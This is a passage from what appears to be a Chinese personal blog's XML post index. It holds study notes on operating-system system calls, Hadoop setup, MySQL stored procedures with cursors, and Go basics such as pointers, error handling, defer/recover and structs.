src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144649749.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620144649749.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620144649749"></p><h1 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h1><h2 id="什么是系统调用"><a href="#什么是系统调用" class="headerlink" title="什么是系统调用"></a>什么是系统调用</h2><p>“系统调用”是操作系统提供给应用程序使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以通过系统调用来请求获得操作系统内核的服务</p><h2 id="系统调用与库函数区别"><a href="#系统调用与库函数区别" class="headerlink" title="系统调用与库函数区别"></a>系统调用与库函数区别</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620145024373.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620145024373.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620145024373"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620145158353.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620145158353.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620145158353"></p><h2 id="系统调用的过程"><a href="#系统调用的过程" class="headerlink" title="系统调用的过程"></a>系统调用的过程</h2><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154214645.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154214645.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154214645"></p><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154243383.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154243383.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154243383"></p><h1 id="操作系统的内核"><a href="#操作系统的内核" class="headerlink" title="操作系统的内核"></a>操作系统的内核</h1><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154434390.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154434390.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154434390" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154444743.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154444743.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154444743" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154456121.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154456121.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154456121" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154629610.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154629610.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154629610" style="zoom:50%;"><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154638723.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154638723.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154638723" style="zoom:50%;"><p><img src="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154922643.png" class="lazyload" data-srcset="/2021/06/20/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%A4%8D%E4%B9%A0-1/image-20210620154922643.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210620154922643"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hadoop文件系统配置</title>
      <link href="/2021/06/02/Hadoop%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/Hadoop%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/"/>
      <url>/2021/06/02/Hadoop%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/Hadoop%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="JAVA环境配置"><a href="#JAVA环境配置" class="headerlink" title="JAVA环境配置"></a>JAVA环境配置</h1><p>由于Hadoop是基于java编写，所以先配置好java路径的变量</p><p>下载</p><p>linux配置profile文件</p>]]></content>
      
      
      
        <tags>
            
            <tag> Hadoop </tag>
            
            <tag> 环境配置 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql-存储过程</title>
      <link href="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/"/>
      <url>/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>存储过程</strong>（<code>Stored Procedure</code>）是一种在数据库中存储复杂程序，以便外部程序调用的一种数据库对象。</p><p>存储过程是为了完成特定功能的 <code>SQL</code> 语句集，经编译创建并保存在数据库中，用户可通过指定存储过程的名字并给定参数（需要时）来调用执行。</p><p>类似设定在数据的函数可以设置参数和返回值</p><ul><li>游标定义</li></ul><p><code>DECLARE 光标名称 CURSOR FOR 查询语法</code></p><ul><li>打开游标</li></ul><p><code>OPEN 光标名称</code></p><ul><li>取出游标的数据</li></ul><p><code>FETCH 光标名称 INFO var_name [，var_name ].....</code></p><ul><li>关闭游标</li></ul><p><code>close 光标名称</code></p><p>对一下表的Cno为C1的项的分数+5</p><img src="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/image-20210531191749021.png" class="lazyload" data-srcset="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/image-20210531191749021.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210531191749021" style="zoom:50%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">#使用的是loop循环 </span><br><span class="line">drop procedure IF EXISTS test4;</span><br><span class="line">delimiter $$  </span><br><span class="line">CREATE PROCEDURE test4()</span><br><span class="line">BEGIN</span><br><span class="line">DECLARE c_num CHAR(4);</span><br><span class="line">DECLARE scores INT;</span><br><span class="line">DECLARE done INT DEFAULT FALSE;</span><br><span class="line">DECLARE  mycursor CURSOR </span><br><span class="line">FOR  SELECT grade,Cno FROM SC </span><br><span class="line">WHERE Cno=(SELECT Cno  FROM C WHERE Cname=&#x27;DB&#x27;);</span><br><span class="line">DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;</span><br><span class="line"></span><br><span class="line">OPEN mycursor;</span><br><span class="line">read_Loop:LOOP</span><br><span class="line">fetch mycursor INTO scores,c_num;</span><br><span class="line">#如果游标读不到的数据后 ，激活handler 设置done为true 跳出循环</span><br><span class="line"> IF done THEN</span><br><span class="line">    LEAVE read_Loop;</span><br><span class="line">END IF;</span><br><span class="line">UPDATE SC SET grade=scores+5 </span><br><span class="line">WHERE Cno=c_num AND grade=scores;</span><br><span class="line">SELECT scores,c_num;</span><br><span class="line"></span><br><span class="line">END LOOP read_Loop;</span><br><span class="line">close mycursor;</span><br><span class="line">End $$</span><br><span class="line">delimiter ;</span><br></pre></td></tr></table></figure><p>必须注意的是此处采用的是<code>loop</code>循环，<code>loop</code>循环必须跟一个标签一起使用，此时使用的是<code>read_Loop</code>，这里还有一个点需要注意，声明语句必须在执行语句之前，并且<strong>应该按照普通变量、游标、句柄的顺序声明</strong></p><p>运行前：<img src="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/image-20210531192846122.png" class="lazyload" data-srcset="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/image-20210531192846122.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210531192846122" style="zoom:67%;">运行后：<img src="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/image-20210531192913174.png" class="lazyload" data-srcset="/2021/05/31/%E6%95%B0%E6%8D%AE%E5%BA%93/Mysql-%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B/image-20210531192913174.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210531192913174" style="zoom:67%;"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#带参数的存储过程</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Mysql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>go基本语法</title>
      <link href="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">str:=<span class="string">&quot;Test&quot;</span></span><br><span class="line"><span class="comment">//指针声明</span></span><br><span class="line"><span class="keyword">var</span> p *<span class="keyword">string</span>=&amp;str;</span><br><span class="line">fmt.Println(reflect.TypeOf(p))</span><br><span class="line">fmt.Println(p)</span><br></pre></td></tr></table></figure><p>指针通常在函数传递参数，或者给某个类型定义新的方法时使用。Go 语言中，参数是按值传递的，如果不使用指针，函数内部将会拷贝一份参数的副本，对参数的修改并不会影响到外部变量的值。如果参数使用指针，对参数的传递将会影响到外部变量。</p><h1 id="错误处理-error-handling"><a href="#错误处理-error-handling" class="headerlink" title="错误处理(error handling)"></a>错误处理(error handling)</h1><p>如果函数实现过程中，如果出现不能处理的错误，可以返回给调用者处理。比如我们调用标准库函数<code>os.Open</code>读取文件，<code>os.Open</code> 有2个返回值，第一个是 <code>*File</code>，第二个是 <code>error</code>， 如果调用成功，<strong>error 的值是 nil</strong>，如果调用失败，例如文件不存在，我们可以通过 error 知道具体的错误信息。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_,err := os.Open(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(err != <span class="literal">nil</span>)&#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530162917190.png" class="lazyload" data-srcset="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530162917190.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530162917190"></p><h2 id="自定义错误"><a href="#自定义错误" class="headerlink" title="自定义错误"></a>自定义错误</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">fmt</span><br><span class="line">error</span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">test_error</span><span class="params">(name <span class="keyword">string</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(name)==<span class="number">0</span>&#123;</span><br><span class="line"><span class="keyword">return</span> errors.New(<span class="string">&quot;error name is null &quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">&quot;Hello&quot;</span>,name);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">err:=test_error(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> err!=<span class="literal">nil</span>&#123;</span><br><span class="line">    fmt.Println(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530163523902.png" class="lazyload" data-srcset="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530163523902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530163523902"></p><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><p>Go 语言也提供了类似的机制 <code>defer</code> 和 <code>recover</code></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">get</span><span class="params">(index <span class="keyword">int</span>)</span> <span class="params">(ret <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">//defer函数内定义了异常处理函数 在函数退出前</span></span><br><span class="line"><span class="comment">//会执行defer的内容,若是发生了错误直接将控制权</span></span><br><span class="line"><span class="comment">//交给此函数，在defer的处理逻辑中</span></span><br><span class="line"><span class="comment">//使用recover( )使程序恢复正常 </span></span><br><span class="line"><span class="built_in">println</span>(<span class="string">&quot;执行defer&quot;</span>)</span><br><span class="line">r := <span class="built_in">recover</span>()</span><br><span class="line"><span class="keyword">if</span> r != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">//正常执行 是不会执行recover() 此时的r==nil</span></span><br><span class="line">fmt.Println(<span class="string">&quot;Some error happened!&quot;</span>, r)</span><br><span class="line">ret = <span class="number">-1</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">arr := [<span class="number">3</span>]<span class="keyword">int</span>&#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line"><span class="keyword">return</span> arr[index]</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(get(<span class="number">0</span>));</span><br><span class="line">fmt.Println(get(<span class="number">3</span>));</span><br></pre></td></tr></table></figure><p><img src="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530165107662.png" class="lazyload" data-srcset="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530165107662.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210530165107662"></p><h1 id="结构体，方法和接口"><a href="#结构体，方法和接口" class="headerlink" title="结构体，方法和接口"></a>结构体，方法和接口</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> 结构体名 <span class="keyword">struct</span>&#123;</span><br><span class="line">属性名 类型</span><br><span class="line">属性名 类型</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(实例名 *结构体名)</span>方法名<span class="params">(函数参数)</span>函数返回值</span></span><br><span class="line">&#123;</span><br><span class="line">···</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用 Student&#123;field: value, ...&#125;的形式创建 Student 的实例</span></span><br><span class="line"><span class="keyword">type</span> Student <span class="keyword">struct</span> &#123;</span><br><span class="line">name <span class="keyword">string</span> </span><br><span class="line">age <span class="keyword">int</span></span><br><span class="line">sex <span class="keyword">byte</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//创建该结构体的方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(stu *Student)</span> <span class="title">hello</span><span class="params">(person <span class="keyword">string</span>)</span> <span class="title">string</span></span>  &#123;</span><br><span class="line"><span class="keyword">return</span> fmt.Sprintf(<span class="string">&quot;hello %s,I am %s,my sex is %c&quot;</span>,person,stu.name,stu.sex)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//实例化结构</span></span><br><span class="line">    stu_first:=Student&#123;</span><br><span class="line">        name:<span class="string">&quot;we&quot;</span>,</span><br><span class="line">        sex:<span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//实例化结构体指针 可以通过stu.name直接返回属性</span></span><br><span class="line">    stu:=&amp;Student&#123;</span><br><span class="line">name:<span class="string">&quot;Tom&quot;</span>,</span><br><span class="line">sex:<span class="string">&#x27;m&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(reflect.TypeOf(stu_first))</span><br><span class="line">    msg:=stu.hello(<span class="string">&quot;cia&quot;</span>)</span><br><span class="line">fmt.Println(msg)</span><br><span class="line">fmt.Println(reflect.TypeOf(stu))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//直接使用new实例 实例完返回结构体的指针</span></span><br><span class="line">stu:=<span class="built_in">new</span>(Student)</span><br><span class="line">stu.name=<span class="string">&quot;caixukun&quot;</span></span><br><span class="line">fmt.Println(reflect.TypeOf(stu))</span><br><span class="line">fmt.Println(stu.hello(<span class="string">&quot;123&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530190954843.png" class="lazyload" data-srcset="/2021/05/30/GO/go%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/image-20210530190954843.png" 